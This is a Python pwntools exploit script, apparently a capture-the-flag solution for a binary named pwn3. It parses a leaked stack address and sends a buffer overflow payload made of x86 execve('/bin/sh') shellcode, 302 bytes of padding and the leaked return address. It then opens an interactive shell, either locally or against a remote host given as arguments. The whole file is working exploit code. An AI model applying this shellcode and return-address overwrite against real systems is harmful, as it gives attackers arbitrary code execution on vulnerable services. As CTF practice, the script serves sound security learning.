from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *echo+61
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn3'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Print out the text, up to the address of the start of our input


io = start()

io.recvuntil("journey ")

# Scan in the rest of the line
leak = io.recvline()
# Split the bytes object and get the last part, then strip the unwanted bytes
address_bytes = leak.split()[-1].strip(b"!\n")

# Convert the address to an integer
address_int = int(address_bytes, 16)

print(hex(address_int))

padding = 302
## Shellcode for execve
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = flat(
    shell,
    b'A' * (302 - len(shell)),
    p32(address_int),
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline(payload)

# Receive the flag
io.interactive()
